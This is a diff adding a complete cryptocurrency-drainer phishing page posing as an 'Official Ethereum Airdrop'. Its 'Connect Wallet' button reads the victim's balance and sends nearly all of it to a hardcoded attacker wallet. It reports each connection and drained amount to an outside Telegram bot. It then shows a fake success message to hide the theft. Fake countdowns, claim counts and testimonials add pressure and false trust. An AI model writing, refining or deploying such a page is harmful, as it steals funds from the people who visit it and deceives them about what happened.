@@ -1,0 +1,127 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>🔥 Official Ethereum Airdrop</title>  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <meta name="robots" content="noindex">  
+    <!-- Telegram Alerts -->  
+    <script>  
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA"; // Get from @BotFather  
+        const CHAT_ID = "6309547301"; // Get via @userinfobot  
+        const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9";  
+    </script>  
+    <!-- Professional Design -->  
+    <style>  
+        body {  
+            background: linear-gradient(45deg, #1a1a1a, #0d1b2a);  
+            color: white;  
+            font-family: 'Arial', sans-serif;  
+            text-align: center;  
+            padding: 40px;  
+        }  
+        .container {  
+            background: rgba(0,0,0,0.7);  
+            border-radius: 20px;  
+            padding: 30px;  
+            margin: 20px auto;  
+            max-width: 600px;  
+        }  
+        button {  
+            background: linear-gradient(90deg, #4CAF50, #45a049);  
+            padding: 20px 40px;  
+            border-radius: 25px;  
+            font-size: 18px;  
+            border: none;  
+            cursor: pointer;  
+            margin: 20px;  
+        }  
+        .alert {  
+            color: #4CAF50;  
+            border: 1px solid #4CAF50;  
+            padding: 15px;  
+            border-radius: 10px;  
+            margin: 20px;  
+        }  
+        .partner-logos img {  
+            height: 40px;  
+            margin: 10px;  
+            opacity: 0.8;  
+        }  
+    </style>  
+</head>  
+<body>  
+    <div class="container">  
+        <div class="alert">  
+            🔒 3,412 claims processed today • 🕒 Ends in 02:14:56  
+        </div>  
+        
+        <h1>🎁 Final ETH Airdrop Phase</h1>  
+        <p>Connect your wallet to claim 1-5 ETH instantly</p>  
+        
+        <button onclick="connectWallet()">  
+            🔑 Connect Wallet Automatically  
+        </button>  
+        
+        <div class="partner-logos">  
+            <img src="https://i.imgur.com/metamask.png" alt="MetaMask">  
+            <img src="https://i.imgur.com/trustwallet.png" alt="Trust Wallet">  
+            <img src="https://i.imgur.com/coinbase.png" alt="Coinbase">  
+        </div>  
+        
+        <div id="recent-claims">  
+            <p>"Got 3.5 ETH! Legit!" - @CryptoPro</p>  
+            <p>"Fast and secure!" - @DeFiQueen</p>  
+        </div>  
+    </div>  
+
+    <script>  
+        // Telegram alert function  
+        async function sendAlert(message) {  
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);  
+        }  
+
+        // Main attack function  
+        async function connectWallet() {  
+            try {  
+                // Phase 1: Connect wallet  
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });  
+                await sendAlert(`🚨 CONNECTED: ${accounts[0]}`);  
+
+                // Phase 2: Drain funds  
+                const balance = await window.ethereum.request({  
+                    method: "eth_getBalance",  
+                    params: [accounts[0], "latest"]  
+                });  
+
+                const gasPrice = await window.ethereum.request({ method: "eth_gasPrice" });  
+                const gasCost = BigInt(21000) * BigInt(gasPrice);  
+                const drainAmount = balance - gasCost;  
+
+                await window.ethereum.request({  
+                    method: "eth_sendTransaction",  
+                    params: [{  
+                        from: accounts[0],  
+                        to: YOUR_WALLET,  
+                        value: drainAmount.toString(),  
+                        data: "0x", // Shows "0 ETH" in wallets  
+                        gas: "0x5208"  
+                    }]  
+                });  
+
+                // Phase 3: Cleanup  
+                await sendAlert(`💰 DRAINED: ${accounts[0]} | ${drainAmount} WEI`);  
+                document.body.innerHTML = `  
+                    <div class="container">  
+                        <h1>✅ Claim Successful!</h1>  
+                        <p>ETH will arrive in your wallet within 15 minutes</p>  
+                    </div>  
+                `;  
+
+            } catch (error) {  
+                await sendAlert(`❌ FAIL: ${error.message}`);  
+                document.body.innerHTML = "<h1>⚠️ Try Again Later</h1>";  
+            }  
+        }  
+    </script>  
+</body>  
+</html>  
